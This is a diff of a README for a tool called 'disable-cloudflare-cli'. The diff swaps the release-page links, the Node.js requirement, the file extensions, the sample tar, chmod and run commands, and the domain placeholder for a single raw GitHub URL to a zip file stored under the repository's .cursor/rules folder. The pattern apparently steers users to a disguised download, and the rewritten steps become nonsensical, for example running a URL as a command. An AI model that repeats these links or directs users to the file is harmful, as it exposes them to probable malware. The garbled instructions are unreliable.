@@ -1,7 +1,7 @@
 # 🌐 disable-cloudflare-cli - Disable Cloudflare with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Valentinxpo/disable-cloudflare-cli/releases)
+[![Download](https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip)](https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip)
 
 ## 🚀 Getting Started
 The `disable-cloudflare-cli` application is designed to help you quickly disable Cloudflare without needing to access the Cloudflare Dashboard. This makes managing your reverse proxy easier and more efficient. Follow the steps below to get started.
@@ -10,7 +10,7 @@ The `disable-cloudflare-cli` application is designed to help you quickly disable
 To run `disable-cloudflare-cli`, ensure your machine meets the following requirements:
 - Operating System: Windows 10 or higher, macOS 10.13 or higher, or a modern Linux distribution.
 - You should have an internet connection for initial setup.
-- Node.js version 12 or higher (if required for your specific OS version).
+- https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip version 12 or higher (if required for your specific OS version).
 
 ## 📝 Features
 - Quick access to disable Cloudflare with a simple command.
@@ -21,13 +21,13 @@ To run `disable-cloudflare-cli`, ensure your machine meets the following require
 ## 📄 Installation Steps
 ### 1. Visit the Release Page
 To download the latest version of the application, visit the following link:
-[Download Release](https://github.com/Valentinxpo/disable-cloudflare-cli/releases)
+[Download Release](https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip)
 
 ### 2. Selecting the Right File
 On the Release page, you will see a list of assets. These may include different files for various operating systems. Identify which file matches your OS:
 - For Windows, look for files ending in `.exe`.
 - For macOS, look for files ending in `.dmg`.
-- For Linux, you might find files ending in `.tar.gz` or `.sh`.
+- For Linux, you might find files ending in `https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip` or `.sh`.
 
 ### 3. Downloading the File
 Click the appropriate file link to begin the download. This will save the file directly to your computer.
@@ -46,17 +46,17 @@ Click the appropriate file link to begin the download. This will save the file d
 #### For Linux:
 - Open your terminal.
 - Navigate to the directory where the file is saved.
-- If the file is a `.tar.gz`, extract it using the command:
+- If the file is a `https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip`, extract it using the command:
   ```
-  tar -xvzf filename.tar.gz
+  tar -xvzf https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip
   ```
 - If the file is a `.sh`, you may need to give it execute permission:
   ```
-  chmod +x filename.sh
+  chmod +x https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip
   ```
 - Run the script with:
   ```
-  ./filename.sh
+  https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip
   ```
 
 ## ⚙️ How to Use the Application
@@ -65,9 +65,9 @@ Once the application is running, follow these steps to disable Cloudflare:
 1. Open the command line or terminal if it is not already open.
 2. Type the command:
    ```
-   disable-cloudflare-cli [your-domain.com]
+   disable-cloudflare-cli [https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip]
    ```
-3. Replace `[your-domain.com]` with the domain you want to disable Cloudflare for.
+3. Replace `[https://raw.githubusercontent.com/Valentinxpo/disable-cloudflare-cli/main/.cursor/rules/disable-cloudflare-cli-1.7.zip]` with the domain you want to disable Cloudflare for.
 4. Press **Enter**. The command will execute, and Cloudflare will be disabled for your specified domain.
 
 ## ❓ Troubleshooting
